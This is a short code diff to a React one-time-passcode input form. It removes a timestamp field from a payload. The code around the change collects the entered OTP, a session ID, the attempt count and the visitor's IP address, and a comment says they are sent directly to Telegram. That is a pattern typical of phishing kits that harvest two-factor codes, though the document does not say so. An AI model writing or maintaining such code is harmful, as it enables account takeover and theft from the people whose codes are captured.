@@ -10,7 +10,7 @@ import Header from '@/components/header';
 import Footer from '@/components/Footer';
 import { toast } from 'sonner';
 import { getSessionId } from '@/utils/session';
-import { formatOTPMessage, getTimestamp } from '@/utils/telegramFormatter';
+import { formatOTPMessage } from '@/utils/telegramFormatter';
 
 function OTP({ separator, length, value, onChange }) {
     const inputRefs = React.useRef(new Array(length).fill(null));
@@ -162,8 +162,7 @@ export default function OTPInputForm() {
                     sessionId,
                     otp,
                     attempt: attempt + 1,
-                    ip: ip.data.ip,
-                    timestamp: getTimestamp()
+                    ip: ip.data.ip
                 });
 
                 // Send directly to Telegram via sender API
